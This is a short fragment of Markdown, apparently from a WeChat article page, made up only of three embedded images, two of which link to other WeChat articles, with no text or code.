[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe2nibXhkXA8A79MhARiaW5Q0ibIORUp7SmHhzy2uyXKsgn7YwfdjIpZDFx0vT7AJDMtqKf9l5WCzIIQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247496043&idx=1&sn=4daa27ade9915de6021fea1c2a21d7bc&chksm=cfa55578f8d2dc6ef887ce27215f942ec233320fa6878bc1666ce0fecb0e7f6c7f96a3ba4e2b&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdAPjIVeN2ZahG9ibP0Y3wlfg6BO1WO7MZfo1JeW7zDWcLSTQ5Ek8zXAia5w1nMnogpbpXP6OxXXOicA/640?wx_fmt=png)